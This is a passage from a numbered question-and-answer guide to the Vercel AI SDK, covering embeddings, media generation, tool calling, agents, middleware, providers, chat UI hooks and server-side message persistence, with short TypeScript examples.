`useCompletion` is for single-prompt text generation without chat history, like "summarize this" or autocomplete. It returns `completion`, `input`, `setInput`, `handleInputChange`, `handleSubmit`, `complete`, `isLoading`, `error` and `stop`.

Unlike `useChat`, it still manages the input field for you, because it is a simple one-shot use case.

## 58: What is an embedding?

An embedding is a list of numbers (a vector) that represents the meaning of a piece of text. Texts with similar meaning have vectors that are close to each other.

Embeddings are used for semantic search, recommendations, clustering and retrieval-augmented generation (RAG).

## 59: How do you create an embedding for one piece of text?

Use `embed` with an embedding model and a `value`.

```ts
import { embed } from "ai";

const { embedding, usage } = await embed({
  model: "openai/text-embedding-3-small",
  value: "Sunny day at the beach",
});

console.log(embedding.length); // number of dimensions
```

With a provider package you write `openai.embedding('text-embedding-3-small')`. Before AI SDK 6 that method was called `textEmbeddingModel`.

## 60: How do you embed many texts at once?

Use `embedMany` with a `values` array. It returns `embeddings` in the same order as the input.

```ts
import { embedMany } from "ai";

const { embeddings } = await embedMany({
  model: "openai/text-embedding-3-small",
  values: ["first document", "second document", "third document"],
});
```

If the provider has a limit on how many values fit in one request, `embedMany` splits the work into several calls for you.

## 61: How do you compare two embeddings?

Use `cosineSimilarity`. It returns a number from -1 to 1, where higher means more similar.

```ts
import { cosineSimilarity, embedMany } from "ai";

const { embeddings } = await embedMany({
  model: "openai/text-embedding-3-small",
  values: ["cat", "kitten"],
});

console.log(cosineSimilarity(embeddings[0], embeddings[1]));
```

For a real app with many documents you would store vectors in a vector database instead of comparing them in a loop.

## 62: What does rerank do?

`rerank` takes a query and a list of documents and sorts the documents by how relevant they are to the query, using a reranking model. It's often used after a fast vector search to improve the order of the top results.

```ts
import { rerank } from "ai";
import { cohere } from "@ai-sdk/cohere";

const { rerankedDocuments, ranking } = await rerank({
  model: cohere.reranking("rerank-v3.5"),
  query: "How do I cancel my order?",
  documents: ["Shipping times", "Order cancellation policy", "Gift cards"],
  topN: 2,
});
```

`ranking` contains the original index and score of each result.

## 63: How do you generate an image with the AI SDK?

Use `generateImage` with an image model.

```ts
import { generateImage } from "ai";
import { openai } from "@ai-sdk/openai";

const { image } = await generateImage({
  model: openai.image("gpt-image-2"),
  prompt: "A watercolor fox in a snowy forest",
  size: "1024x1024",
});

// image.base64 or image.uint8Array
```

It used to be `experimental_generateImage`. AI SDK 7 made it stable.

## 64: How do you turn text into speech?

Use `generateSpeech` with a speech model. It returns an `audio` object with the data as base64 or a `Uint8Array`.

```ts
import { generateSpeech } from "ai";
import { openai } from "@ai-sdk/openai";

const { audio } = await generateSpeech({
  model: openai.speech("tts-1"),
  text: "Your order has shipped.",
  voice: "alloy",
});
```

`experimental_generateSpeech` is the old, now deprecated name.

## 65: How do you turn audio into text?

Use `transcribe` with a transcription model and the audio data (a `Uint8Array`, `ArrayBuffer`, `Buffer`, base64 string or URL).

```ts
import { transcribe } from "ai";
import { openai } from "@ai-sdk/openai";
import { readFile } from "node:fs/promises";

const { text, segments, language } = await transcribe({
  model: openai.transcription("whisper-1"),
  audio: await readFile("meeting.mp3"),
});
```

Before AI SDK 7 it was `experimental_transcribe`.

## 66: How do you send an image to a model?

Use a `messages` array and put a `file` part with an image media type in the user message content.

```ts
await generateText({
  model: "openai/gpt-5.5",
  messages: [
    {
      role: "user",
      content: [
        { type: "text", text: "What is in this picture?" },
        {
          type: "file",
          data: new URL("https://example.com/cat.jpg"),
          mediaType: "image/jpeg",
        },
      ],
    },
  ],
});
```

The data can also be a base64 string, a `Uint8Array` or a `Buffer`. Older code uses `{ type: 'image', image: ... }`, which still works but AI SDK 7 deprecates it in favor of the `file` part.

## 67: How do you send a PDF to a model?

Use a `file` part with `mediaType: 'application/pdf'`. The model must support PDF input.

```ts
import { readFile } from "node:fs/promises";

await generateText({
  model: "anthropic/claude-sonnet-5.5",
  messages: [
    {
      role: "user",
      content: [
        { type: "text", text: "Summarize this contract." },
        {
          type: "file",
          data: await readFile("contract.pdf"),
          mediaType: "application/pdf",
        },
      ],
    },
  ],
});
```

## 68: How do you send files from useChat?

Pass `files` to `sendMessage`. It accepts a `FileList` from an `<input type="file">` or an array of file parts. They are added as `file` parts in the user message.

```tsx
const [files, setFiles] = useState<FileList | undefined>();

sendMessage({ text: input, files });
```

On the server, `convertToModelMessages` turns those parts into model file parts.

## 69: What are providerOptions?

`providerOptions` lets you pass settings that only one provider understands, without breaking the common API. You key them by provider name.

```ts
await generateText({
  model: "openai/gpt-5.5",
  prompt: "Hello",
  providerOptions: {
    openai: { serviceTier: "flex" },
  },
});
```

Other providers ignore keys that are not theirs, so the same call can carry options for several providers.

## 70: What is the reasoning option?

`reasoning` sets how much a reasoning model should "think" before answering. The values are `'provider-default'`, `'none'`, `'minimal'`, `'low'`, `'medium'`, `'high'`, `'xhigh'` and `'max'`.

```ts
await generateText({
  model: "openai/gpt-5.5",
  reasoning: "low",
  prompt: "Is 97 a prime number?",
});
```

The SDK maps it to each provider's own setting. If you also set reasoning in `providerOptions`, the provider option wins.

## 71: How do you read the model's reasoning?

Reasoning models can return their reasoning (or a summary of it) separately from the answer. In `generateText` you read it from the steps, for example `result.finalStep.reasoningText`. In the UI it shows up as `reasoning` parts in the assistant message.

Not every provider returns reasoning text, and some only return a summary.

## 72: What are sources?

Some models and tools (like web search) return the URLs or documents they used. The SDK exposes them as `sources` on the result, and as `source-url` and `source-document` parts in UI messages.

You can show them under the answer as references.

## 73: How do you cancel a model call on the server?

Pass an `AbortSignal` in `abortSignal`. When the signal fires, the request to the provider is cancelled.

```ts
const result = streamText({
  model: "openai/gpt-5.5",
  prompt: "Write a long story.",
  abortSignal: req.signal,
});
```

Using the incoming request's signal means generation stops when the user closes the page or clicks stop.

## 74: How do you set a timeout for a model call?

Use the `timeout` option. A number is a total timeout in milliseconds. An object lets you set different limits.

```ts
await generateText({
  model: "openai/gpt-5.5",
  prompt: "Hello",
  timeout: { totalMs: 30_000, stepMs: 10_000 },
});
```

The object form also has `firstChunkMs`, `chunkMs` (streaming only), `toolMs` and per-tool limits.

## 75: Does the AI SDK retry failed requests?

Yes. `maxRetries` controls how many times the SDK retries a failed call that can be retried, such as a rate limit or a server error. The default is 2. Set it to 0 to turn retries off.

If all retries fail, the SDK throws a `RetryError` that contains the last error and all the errors on the way.

## 76: What is APICallError?

`APICallError` is thrown when the provider's HTTP API returns an error. It has the `statusCode`, `url`, `responseBody`, `requestBodyValues` and an `isRetryable` flag.

```ts
import { APICallError } from "ai";

try {
  await generateText({ model: "openai/gpt-5.5", prompt: "Hi" });
} catch (error) {
  if (APICallError.isInstance(error)) {
    console.log(error.statusCode, error.responseBody);
  }
}
```

Use `isInstance` instead of `instanceof`, because it also works when two copies of the package are installed.

## 77: How does error handling differ in streamText?

`streamText` does not throw errors for problems that happen during streaming, because the function has already returned. Errors become `error` parts in the stream. You can also pass an `onError` callback to log them.

```ts
const result = streamText({
  model: "openai/gpt-5.5",
  prompt: "Hello",
  onError({ error }) {
    console.error(error);
  },
});
```

If you don't handle them, they can go unnoticed, so always add `onError` or read the stream's error parts.

## 78: What is the onEnd callback?

`onEnd` runs once when the whole `generateText` or `streamText` call is done, including all steps and tool runs. It receives the final text, the steps, usage and more.

It's a good place to save the result to a database or log token usage. In AI SDK 6 and earlier this callback was called `onFinish`. `onFinish` still works in 7 but is deprecated.

## 79: What is the onStepEnd callback?

`onStepEnd` runs after each step finishes. It gets that step's text, tool calls, tool results, finish reason and usage.

You can use it to log tool calls, update progress, or save partial work. Its old name was `onStepFinish`.

## 80: What is the onChunk callback?

`onChunk` is a `streamText` callback that runs for every piece of the stream: text deltas, reasoning, tool calls, tool results and so on. Use it for logging or metrics on raw chunks. For most UI work, you read the streams instead.

## 81: What is the difference between textStream and stream?

`textStream` gives you only the text pieces as strings. `stream` gives you every event with a `type`: text deltas, reasoning, tool calls, tool results, sources, step starts and ends, errors and the finish event.

Use `textStream` for simple text output. Use `stream` when you also need tool calls or other events. In AI SDK 6 and earlier `stream` was called `fullStream`.

## 82: What is toolChoice?

`toolChoice` controls whether and which tools the model may call:

- `'auto'` (default): the model decides.
- `'required'`: the model must call some tool.
- `'none'`: the model must not call tools.
- `{ type: 'tool', toolName: 'x' }`: the model must call that tool.

```ts
toolChoice: { type: 'tool', toolName: 'getWeather' }
```

## 83: What is activeTools?

`activeTools` is a list of tool names that the model can see for the call. The other tools stay defined, so types still work, but they are not sent to the model.

It is useful when you have many tools but only some of them make sense for the current step. It used to be `experimental_activeTools`.

## 84: What are tool results and how does the model get them?

After the SDK runs a tool's `execute`, it stores the return value as a tool result. In a multi-step loop it adds the tool call and the result to the messages and calls the model again, so the model can use the result in its answer.

You can see them in `result.toolResults` (for the final step) or in each entry of `result.steps`.

## 85: How do you show tool calls in the chat UI?

Tool calls appear as parts with the type `tool-<toolName>`. Each part has a `state` that tells you where it is: `input-streaming`, `input-available`, `output-available` or `output-error`. With approvals there are also `approval-requested`, `approval-responded` and `output-denied`.

```tsx
{
  message.parts.map((part, i) => {
    if (part.type === "tool-getWeather") {
      if (part.state === "output-available") {
        return (
          <div key={i}>
            {part.output.city}: {part.output.tempC}°C
          </div>
        );
      }
      return <div key={i}>Checking the weather...</div>;
    }
    return null;
  });
}
```

## 86: What is a dynamic tool?

A dynamic tool is a tool whose input and output types are not known when you write the code, for example tools that come from an MCP server at runtime. You create one with `dynamicTool`, and its input is typed as `unknown`.

In the UI, dynamic tools show up as `dynamic-tool` parts instead of `tool-<name>` parts.

## 87: What is MCP and how does the AI SDK support it?

MCP (Model Context Protocol) is an open standard for exposing tools, resources and prompts to AI apps. The AI SDK has an MCP client in the `@ai-sdk/mcp` package. It connects to an MCP server and turns the server's tools into AI SDK tools.

```ts
import { createMCPClient } from "@ai-sdk/mcp";

const client = await createMCPClient({
  transport: { type: "http", url: "https://mcp.example.com/mcp" },
});

const tools = await client.tools();
// pass tools to generateText or streamText, then later:
await client.close();
```

## 88: What is an agent in the AI SDK?

An agent is a model that runs in a loop: it calls tools, reads the results and decides what to do next until the task is done. In the AI SDK you can build this with `generateText` plus `stopWhen`, or use the `ToolLoopAgent` class, which packages the model, instructions, tools and stop conditions into one reusable object.

## 89: How do you create a ToolLoopAgent?

You pass the settings to the constructor once and then call `generate` or `stream` as many times as you want.

```ts
import { ToolLoopAgent, tool } from "ai";
import { z } from "zod";

const supportAgent = new ToolLoopAgent({
  model: "anthropic/claude-sonnet-5.5",
  instructions: "You help customers with their orders.",
  tools: {
    getOrder: tool({
      description: "Look up an order by ID",
      inputSchema: z.object({ orderId: z.string() }),
      execute: async ({ orderId }) => ({ orderId, status: "shipped" }),
    }),
  },
});

const { text } = await supportAgent.generate({ prompt: "Where is order 123?" });
```

## 90: What is the default stop condition of ToolLoopAgent?

`ToolLoopAgent` stops after 20 steps by default (`isStepCount(20)`), or earlier when the model answers without calling a tool. `generateText` and `streamText` default to one step.

You can override it with your own `stopWhen`.

## 91: What did ToolLoopAgent replace?

In AI SDK 5 the agent class was called `Experimental_Agent`. AI SDK 6 renamed it to `ToolLoopAgent` and turned `Agent` into an interface that other agent classes can also implement.

`Experimental_Agent` is still exported as an alias, but new code should use `ToolLoopAgent`.

## 92: What is middleware in the AI SDK?

Language model middleware wraps a model and can change the request before it goes out and the response before it comes back. You use it for logging, caching, guardrails, default settings or adding RAG context.

```ts
import { wrapLanguageModel, defaultSettingsMiddleware } from "ai";
import { openai } from "@ai-sdk/openai";

const model = wrapLanguageModel({
  model: openai("gpt-5.5"),
  middleware: defaultSettingsMiddleware({ settings: { temperature: 0.2 } }),
});
```

The wrapped model can be used anywhere a normal model can.

## 93: What built-in middleware does the AI SDK provide?

The `ai` package ships with several middleware helpers:

- `extractReasoningMiddleware`: pulls reasoning out of tags like `<think>` into separate reasoning parts.
- `extractJsonMiddleware`: removes markdown code fences around JSON output.
- `defaultSettingsMiddleware`: applies default settings.
- `defaultInstructionsMiddleware`: adds default instructions.
- `simulateStreamingMiddleware`: makes a non-streaming model look like it streams.
- `addToolInputExamplesMiddleware`: adds tool input examples to the tool description for providers without native support.

## 94: What is a provider registry?

A provider registry lets you refer to models by a string ID, like `'openai:gpt-5.5'`, across many providers. You create it once with `createProviderRegistry` and then call `languageModel`, `embeddingModel` and so on.

```ts
import { createProviderRegistry } from "ai";
import { openai } from "@ai-sdk/openai";
import { anthropic } from "@ai-sdk/anthropic";

export const registry = createProviderRegistry({ openai, anthropic });

const model = registry.languageModel("anthropic:claude-sonnet-5.5");
```

The default separator is `:`, and you can change it.

## 95: What is customProvider used for?

`customProvider` lets you create your own provider with fixed model names that point to real models, often with preset settings or middleware. It is handy for aliases like `fast` and `smart`.

```ts
import { customProvider } from "ai";
import { openai } from "@ai-sdk/openai";

export const myProvider = customProvider({
  languageModels: {
    fast: openai("gpt-5.4-mini"),
    smart: openai("gpt-5.5"),
  },
  fallbackProvider: openai,
});
```

Then you write `myProvider.languageModel('fast')` and change the real model in one place. It was `experimental_customProvider` before AI SDK 7.

## 96: Which Node.js version does AI SDK 7 need?

AI SDK 7 needs Node.js 22 or newer. Its packages are ESM only, so `require('ai')` does not work. Your project must use ES modules or a bundler that handles them.

## 97: How do you upgrade an older project to a new major version?

Vercel publishes codemods that do most of the renames for you, for example `npx @ai-sdk/codemod v7` for AI SDK 7. After running it, read the migration guide and check the things the codemod can't change, like deprecated callbacks or new default behavior.

Upgrade one major version at a time if you are several versions behind.

## 98: What is AI SDK RSC and should you use it?

AI SDK RSC (`@ai-sdk/rsc`) lets you stream React Server Components from the server using functions like `streamUI` and `createStreamableUI`. It is experimental and Vercel recommends AI SDK UI (`useChat` and friends) for production apps.

You may still see it in older Next.js projects.

## 99: What does smoothStream do?

`smoothStream` is a stream transform for `streamText` that releases text at a steady pace, word by word or line by line, instead of in uneven bursts from the provider. It makes the typing effect look nicer.

```ts
import { streamText, smoothStream } from "ai";

const result = streamText({
  model: "openai/gpt-5.5",
  prompt: "Tell me a story.",
  experimental_transform: smoothStream({ chunking: "word" }),
});
```

## 100: How do you write unit tests without calling a real model?

Import mock models from `ai/test`, such as `MockLanguageModelV4`, and pass them as the model. You decide what the mock returns, so tests are fast, free and repeatable.

```ts
import { generateText } from "ai";
import { MockLanguageModelV4 } from "ai/test";

const model = new MockLanguageModelV4({
  doGenerate: async () => ({
    content: [{ type: "text", text: "Hello from the mock" }],
    finishReason: { unified: "stop", raw: "stop" },
    usage: {
      inputTokens: { total: 5, noCache: 5, cacheRead: 0, cacheWrite: 0 },
      outputTokens: { total: 4, text: 4, reasoning: 0 },
    },
    warnings: [],
  }),
});

const { text } = await generateText({ model, prompt: "Hi" });
```

## 101: Which frameworks can you use the AI SDK with?

AI SDK Core works in any JavaScript server runtime: Next.js, Nuxt, SvelteKit, SolidStart, Remix, Express, Fastify, Hono, NestJS, plain Node.js, Deno and Bun.

AI SDK UI has hooks for React, Vue, Svelte and Angular. The back end and front end don't have to use the same framework, as long as the back end returns a stream in the format the hooks expect.

## 102: How do you return a chat stream from an Express server?

Use `pipeUIMessageStreamToResponse`, which writes the stream to a Node.js response object.

```ts
import express from "express";
import {
  convertToModelMessages,
  pipeUIMessageStreamToResponse,
  streamText,
  toUIMessageStream,
} from "ai";

const app = express();
app.use(express.json());

app.post("/api/chat", async (req, res) => {
  const result = streamText({
    model: "openai/gpt-5.5",
    messages: await convertToModelMessages(req.body.messages),
  });

  pipeUIMessageStreamToResponse({
    response: res,
    stream: toUIMessageStream({ stream: result.stream }),
  });
});

app.listen(3000);
```

Frameworks that use the web `Response` type (Next.js, Hono, SvelteKit) use `createUIMessageStreamResponse` instead.

## 103: How do you return plain text instead of a UI message stream?

Use `createTextStreamResponse` with the text stream. The client receives only the text, with no tool calls or metadata.

```ts
import { createTextStreamResponse, streamText, toTextStream } from "ai";

export async function POST(req: Request) {
  const { prompt } = await req.json();
  const result = streamText({ model: "openai/gpt-5.5", prompt });

  return createTextStreamResponse({
    stream: toTextStream({ stream: result.stream }),
  });
}
```

On the client you then use `TextStreamChatTransport` with `useChat`, or set `streamProtocol: 'text'` in `useCompletion`.

## 104: Why should you call models from the server and not the browser?

The API key would be visible to anyone if you called the provider from the browser. Calling from the server keeps the key secret and also lets you check who the user is, apply rate limits and log usage.

That's why the usual setup is: hook in the browser, `streamText` in an API route, key in a server environment variable.

## 105: How does the SDK find the API key?

Each provider reads its key from an environment variable by default, like `OPENAI_API_KEY`, `ANTHROPIC_API_KEY` or `GOOGLE_GENERATIVE_AI_API_KEY`. The gateway reads `AI_GATEWAY_API_KEY`, or uses OIDC when deployed on Vercel.

You can also pass `apiKey` to the `create...` function if the key comes from somewhere else, like a secrets manager.

## 106: What can you pass to sendMessage?

You can pass text, files, metadata, or a full message with parts. A second argument lets you add headers or extra body fields for this one request.

```ts
sendMessage(
  { text: "Summarize the attached file", files },
  { body: { language: "en" } },
);
```

Calling `sendMessage()` with no message sends the current messages again, which is useful after adding tool outputs.

## 107: How do you load an existing conversation into useChat?

Pass the saved messages in the `messages` option, and give the chat an `id` so the server knows which conversation it is.

```tsx
const { messages, sendMessage } = useChat({
  id: chatId,
  messages: initialMessages,
});
```

The messages must be `UIMessage` objects, which is why it's common to save chats in that format.

## 108: What does the id option of useChat do?

`id` identifies a chat. It is sent to the server with each request, so you can load and save the right conversation. Two `useChat` calls with the same `id` share the same state, so different components can show the same chat.

If you don't pass an `id`, the hook generates one.

## 109: What does setMessages do?

`setMessages` lets you change the message list on the client without calling the server, for example to delete a message or edit one. It takes a new array or a function that gets the current array.

```ts
setMessages((messages) => messages.filter((m) => m.id !== idToRemove));
```

## 110: What is message metadata?

Metadata is extra information you attach to a message, like the time it was created, the model used or the token count. It lives in `message.metadata`, not in the parts.

On the server, you set it with the `messageMetadata` option of `toUIMessageStream`. On the client you can type it with a generic: `useChat<UIMessage<{ createdAt: number }>>()`.

## 111: What does onFinish do in useChat?

The `onFinish` option of `useChat` runs on the client when the assistant message is finished. It gets the final `message` and the full `messages` list, plus the flags `isAbort`, `isDisconnect` and `isError`.

You can use it to scroll to the bottom, play a sound, refresh a sidebar or track analytics.

## 112: What is onToolCall in useChat?

`onToolCall` runs in the browser when the model calls a tool that has no `execute` function on the server. You use it for client-side tools, like reading the user's location or the current page, and then report the result with `addToolOutput`.

```tsx
const { addToolOutput } = useChat({
  async onToolCall({ toolCall }) {
    if (toolCall.toolName === "getLocation") {
      addToolOutput({
        tool: "getLocation",
        toolCallId: toolCall.toolCallId,
        output: "Lisbon, Portugal",
      });
    }
  },
});
```

Don't `await` `addToolOutput` inside `onToolCall`, or you can cause a deadlock.

## 113: What does addToolOutput do?

`addToolOutput` adds the result of a client-side tool call to the chat. You can pass an `output`, or `state: 'output-error'` with an `errorText` if the tool failed.

It replaced `addToolResult`, which is deprecated.

## 114: How do you send the conversation again after a client tool finishes?

Use `sendAutomaticallyWhen`. The helper `lastAssistantMessageIsCompleteWithToolCalls` returns true once every tool call in the last assistant message has a result.

```tsx
import { useChat } from "@ai-sdk/react";
import { lastAssistantMessageIsCompleteWithToolCalls } from "ai";

const chat = useChat({
  sendAutomaticallyWhen: lastAssistantMessageIsCompleteWithToolCalls,
});
```

Without it, you would have to call `sendMessage()` yourself after adding the outputs.

## 115: What does the throttle option of useChat do?

`throttle` limits how often the component re-renders while a message streams, in milliseconds. Without it, React may re-render on every chunk, which can be slow for long answers.

```tsx
useChat({ throttle: 50 });
```

It used to be called `experimental_throttle`.

## 116: How does the server send data to useChat?

The UI message stream uses server-sent events (SSE). Each event is a JSON chunk like `text-delta`, `tool-input-available` or `finish`. The response has the header `x-vercel-ai-ui-message-stream: v1` so the client knows the format.

`useChat` reads these chunks and builds the `UIMessage` parts from them.

## 117: What are data parts?

Data parts are custom parts you send from the server inside a message. Their type is `data-<name>`, for example `data-weather` or `data-status`. They let you stream things that are not text, like progress updates, cards or chart data.

You write them with `createUIMessageStream` and the `writer.write` method, and you render them on the client by checking `part.type`.

## 118: How do you help the model fill tool arguments correctly?

Give each schema field a clear name and add a description with `.describe()`. The description is sent to the model as part of the JSON Schema.

```ts
inputSchema: z.object({
  city: z.string().describe('City name, for example "Berlin"'),
  unit: z.enum(['celsius', 'fahrenheit']).describe('Temperature unit'),
}),
```

You can also add `inputExamples` to the tool to show the model sample inputs.

## 119: How do you use a plain JSON Schema instead of Zod?

Wrap it in `jsonSchema`. You can pass a TypeScript type so the input is still typed.

```ts
import { jsonSchema, tool } from "ai";

const search = tool({
  description: "Search the docs",
  inputSchema: jsonSchema<{ query: string }>({
    type: "object",
    properties: { query: { type: "string" } },
    required: ["query"],
  }),
  execute: async ({ query }) => `results for ${query}`,
});
```

This is handy when the schema comes from somewhere else, like an OpenAPI file.

## 120: Can you use schema libraries other than Zod?

Yes. The SDK accepts any library that follows the Standard Schema spec, such as Valibot or ArkType, plus Zod 3, Zod 4 and plain JSON Schema through `jsonSchema`. Zod is just the most common choice in examples.

## 121: What is outputSchema on a tool?

`outputSchema` describes what the tool returns. It's optional for tools with `execute`, because the type is inferred from the function. It's needed for tools without `execute` so the SDK and the UI know the result type.

Some providers and MCP servers also use it to understand structured tool results.

## 122: What does a tool's execute function receive?

It receives the validated input as the first argument and an options object as the second. The options include `toolCallId`, `messages` (the messages sent to the model), `abortSignal` and `context`.

```ts
execute: async ({ query }, { toolCallId, abortSignal }) => {
  const res = await fetch(`https://api.example.com/search?q=${query}`, { signal: abortSignal });
  return res.json();
},
```

Passing `abortSignal` to your own `fetch` calls lets tools stop when the user cancels.

## 123: What happens when a tool's execute function throws?

The SDK catches the error and turns it into a tool error result instead of crashing the whole call. The model sees that the tool failed and can try again or explain the problem. In the UI, the tool part gets the state `output-error` with an `errorText`.

## 124: What is NoSuchToolError?

It is thrown when the model tries to call a tool that is not in the `tools` you passed. This can happen with weaker models or when tool names change between steps.

You can handle it with `repairToolCall`, which lets you fix the call (for example by mapping it to the right name) instead of failing.

## 125: What is InvalidToolInputError?

It is thrown when the model's tool arguments don't match the tool's `inputSchema`, for example a missing field or the wrong type. Like `NoSuchToolError`, you can try to fix it with `repairToolCall`, for example by asking a model to rewrite the arguments.

## 126: What is NoOutputGeneratedError?

It is thrown when you read `result.output` but no output exists, for example because the last step ended with tool calls instead of a final answer, or the model returned no text.

It's different from `NoObjectGeneratedError`, which is thrown when the model did return text but it could not be parsed or did not match the schema. You usually fix these by allowing more steps, making the prompt clearer, or checking `finishReason` before reading the output.

## 127: What is in result.steps?

`steps` is an array with one entry per model call. Each step has its own `text`, `reasoning`, `toolCalls`, `toolResults`, `finishReason`, `usage`, `warnings`, `request` and `response`.

You use it to debug multi-step runs, show a timeline of what the agent did, or calculate cost per step.

## 128: What is result.responseMessages?

`responseMessages` holds all the messages the model produced during the call, across all steps, as `ModelMessage` objects: assistant messages with text and tool calls, and tool messages with results.

To continue a conversation on the server, you append them to your history:

```ts
messages.push(...result.responseMessages);
```

## 129: What is result.finalStep?

`finalStep` is a shortcut for the last item in `steps`. In AI SDK 7, step-specific fields like `reasoning`, `request`, `response` and `providerMetadata` are read from `finalStep`. The same fields at the top level of the result are deprecated.

## 130: What are warnings on the result?

`warnings` lists problems that did not stop the call, like a setting the provider doesn't support (for example `seed` on a provider without it). The SDK also logs them to the console by default.

Checking warnings helps you notice when an option you set is being ignored.

## 131: How do you send custom HTTP headers to the provider?

Use the `headers` option. They are added to the provider request.

```ts
await generateText({
  model: "openai/gpt-5.5",
  prompt: "Hello",
  headers: { "X-Request-Id": requestId },
});
```

This is useful for proxies, tracing or provider features that are switched on with a header.

## 132: When would you use Output.json?

`Output.json` returns any valid JSON without a schema. Use it when the shape varies and you can't describe it in advance, or when you want to validate it yourself later.

If you know the shape, `Output.object` is better because you get validation and types.

## 133: What happens if you use a feature a model does not support?

It depends on the feature. Unsupported settings usually produce a warning and are ignored. Unsupported inputs or features that the call really needs, like a file type the model can't read, throw an `UnsupportedFunctionalityError`.

## 134: What can you pass as the model option?

You can pass either a model object from a provider (like `openai('gpt-5.5')`) or a string. A string is resolved by the global default provider, which is the AI Gateway unless you change it.

```ts
model: openai("gpt-5.5"); // direct provider
model: "openai/gpt-5.5"; // through the gateway
```

## 135: How do you use a model that has an OpenAI-compatible API?

Use `@ai-sdk/openai-compatible` and give it the base URL. Many hosts and local servers (like LM Studio or vLLM) offer an OpenAI-compatible API.

```ts
import { createOpenAICompatible } from "@ai-sdk/openai-compatible";

const local = createOpenAICompatible({
  name: "lmstudio",
  baseURL: "http://localhost:1234/v1",
});

const model = local("qwen3-8b");
```

## 136: What official providers does the AI SDK have?

Vercel maintains providers for OpenAI, Azure OpenAI, Anthropic, Amazon Bedrock, Google (Gemini API), Google Vertex AI, Mistral, xAI, Groq, DeepSeek, Cohere, Together AI, Fireworks, Perplexity and others, plus the AI Gateway. There are also community providers, for example for Ollama and OpenRouter.

All of them implement the same model interface, so the calling code stays the same.

## 137: Which OpenAI API does openai(modelId) use?

Since AI SDK 5, `openai(modelId)` uses OpenAI's Responses API. If you need the older Chat Completions API, use `openai.chat(modelId)`. There is also `openai.responses(modelId)` if you want to be explicit.

The Responses API is needed for features like built-in tools and reasoning summaries.

## 138: What are provider-defined tools?

Some providers offer tools that run on their side, like web search, code execution or file search. You add them from the provider package and the provider runs them, not your code.

```ts
import { openai } from "@ai-sdk/openai";

await generateText({
  model: openai("gpt-5.5"),
  tools: { web_search: openai.tools.webSearch() },
  prompt: "What happened in tech news today?",
});
```

These tools only work with that provider's models.

## 139: What does isLoopFinished do?

`isLoopFinished()` is a stop condition that never stops the loop on its own. The loop keeps going until the model gives a final answer without tool calls. Use it when you don't want a step limit, but be careful because a bad prompt can cause a long, expensive run.

## 140: What does pruneMessages do?

`pruneMessages` removes parts of a message history that you don't need to send again, like old reasoning or old tool calls, to save tokens.

```ts
import { pruneMessages } from "ai";

const smaller = pruneMessages({
  messages,
  reasoning: "before-last-message",
  toolCalls: "before-last-2-messages",
});
```

## 141: What is AI Elements?

AI Elements is a set of React components from Vercel, built on shadcn/ui, made to work with the AI SDK. It has ready parts for chat UIs, like message lists, prompt inputs, code blocks, reasoning views and tool call displays.

You add components to your project with its CLI and edit them like your own code.

## 142: How do you render markdown in streamed answers?

Models often answer in markdown, so you pass text parts to a markdown renderer. A normal renderer can break on half-finished markdown while streaming. Vercel's Streamdown library is made for this case and handles unfinished code blocks and lists.

## 143: What do generateId and createIdGenerator do?

`generateId` creates a random ID string. `createIdGenerator` lets you build your own generator with a prefix, size or alphabet.

```ts
import { createIdGenerator } from "ai";

const messageId = createIdGenerator({ prefix: "msg", size: 16 });
console.log(messageId()); // msg-...
```

You use them to create stable message IDs on the server, which matters when you save messages.

## 144: What is the Chat class in @ai-sdk/react?

`Chat` holds chat state outside a component. You create it once and pass it to `useChat({ chat })`. This lets several components, or a whole app, share one chat without prop drilling.

Svelte and Angular use a `Chat` class as their main API, because they don't use React-style hooks.

## 145: How do you get the full text from streamText without reading the stream?

The result has promises that resolve when the stream ends, such as `result.text`, `result.usage` and `result.finishReason`.

```ts
const result = streamText({ model: "openai/gpt-5.5", prompt: "Hi" });
const text = await result.text;
```

These promises only resolve if the stream is read to the end, either by you, by a response helper, or by `consumeStream`.

## 146: What does consumeStream do?

`consumeStream` reads the whole stream on the server even if no one else reads it. You call it when you need the generation to finish and `onEnd` to run, even if the client disconnects.

```ts
const result = streamText({ model, messages, onEnd: saveChat });
result.consumeStream(); // no await
```

Without it, a closed browser tab can stop the stream before your save code runs.

## 147: What is DirectChatTransport?

`DirectChatTransport` lets `useChat` talk to an agent in the same process without an HTTP API route. You pass it an `agent`, and the transport calls the agent directly.

It's useful in desktop apps, tests and local tools where there is no separate server.

## 148: What is TextStreamChatTransport?

`TextStreamChatTransport` makes `useChat` read a plain text stream instead of a UI message stream. Use it when your back end only returns text, for example from a service that isn't written with the AI SDK.

You lose tool parts, reasoning and metadata, because plain text can't carry them.

## 149: Why use the AI SDK instead of a provider's own SDK?

A provider SDK (like the `openai` npm package) only talks to that provider. The AI SDK gives you one API for many providers, so switching models is a one-line change. It also gives you streaming helpers, a tool loop, structured output, UI hooks and agents that you would otherwise build yourself.

A provider SDK may still be better if you need a brand-new provider feature on the day it is released.

## 150: What is AI SDK DevTools?

AI SDK DevTools (`@ai-sdk/devtools`) is a local debugging tool. It records your AI SDK calls and shows each step's input, output, tool calls, token usage and timing in a web UI.

In AI SDK 7 you turn it on by registering it as a telemetry integration:

```ts
import { registerTelemetry } from "ai";
import { DevToolsTelemetry } from "@ai-sdk/devtools";

registerTelemetry(DevToolsTelemetry());
```

It is experimental and meant only for local development, not production.

# Moderate Questions (151-300)

## 151: How do you save chat messages on the server after each answer?

Pass the incoming messages as `originalMessages` to `toUIMessageStream` and save in its `onEnd` callback. `onEnd` gets the full list of UI messages, including the new assistant message, in the same format the client uses.

```ts
const result = streamText({
  model: "openai/gpt-5.5",
  messages: await convertToModelMessages(messages),
});

return createUIMessageStreamResponse({
  stream: toUIMessageStream({
    stream: result.stream,
    originalMessages: messages,
    generateMessageId: createIdGenerator({ prefix: "msg", size: 16 }),
    onEnd: async ({ messages }) => {
      await saveChat({ chatId, messages });
    },
  }),
});
```

Generating message IDs on the server keeps IDs the same between the client and the database.

## 152: How do you send only the last message from the client instead of the whole history?

Use `prepareSendMessagesRequest` on `DefaultChatTransport` to change the request body. Then load the earlier messages from your database on the server.

```tsx
const { sendMessage } = useChat({
  id: chatId,
  transport: new DefaultChatTransport({
    api: "/api/chat",
    prepareSendMessagesRequest: ({ id, messages }) => ({
      body: { id, message: messages[messages.length - 1] },
    }),
  }),
});
```

This cuts request size for long chats and stops the client from changing old messages.

## 153: Why should you validate UI messages that come from the client?

The client can send anything, including fake tool results or broken parts. If you load messages from the database or accept them from the request, check them with `validateUIMessages` (or `safeValidateUIMessages`) before converting them.

```ts
import { validateUIMessages } from "ai";

